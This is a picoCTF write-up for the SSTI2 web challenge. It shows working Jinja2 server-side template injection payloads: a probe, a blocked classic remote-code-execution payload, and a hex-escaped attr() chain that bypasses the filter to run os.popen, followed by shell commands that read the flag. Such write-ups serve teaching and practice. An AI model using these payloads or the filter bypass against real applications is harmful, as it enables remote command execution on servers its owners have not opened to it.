# 🧨 SSTI2 — Jinja2 Template Injection to Shell Execution (picoCTF)

**Author:** picoCTF Team  
**Category:** Web Exploitation  
**Difficulty:** 🟠 Medium  
**Tags:** `SSTI`, `Jinja2`, `RCE`, `Template Injection`, `Filter Bypass`

---

## 📘 Description

> A server is rendering user input inside templates... can you make it execute a command and leak the flag?

---

## 🚀 Challenge Deployment


---

## 🔥 Vulnerability: Server-Side Template Injection (SSTI)

The target application renders unsanitized user input within Jinja2 templates. This allows arbitrary code execution if filters are not strict.

---

## 💣 Exploitation Steps

### 🧪 Step 1: Confirm Template Injection

```jinja2
{{7*'7'}}
```
📥 Response:

```
7777777
```
✅ Jinja2 confirmed.


### 🔐 Step 2: Attempt Classic RCE Payload (Blocked)
```jinja2

{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
❌ Blocked by filter

### 🧠 Step 3: Bypass Filter with Obfuscated Payload
Inspired by SecGus PayloadsAllTheThings contribution

```jinja2

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
✅ Successfully bypassed the filter

### 🗂️ Step 4: Interact with Shell
```bash
ls
cat flag
```
📥 Output:
```
picoCTF{sst1_f1lt3r...}
```
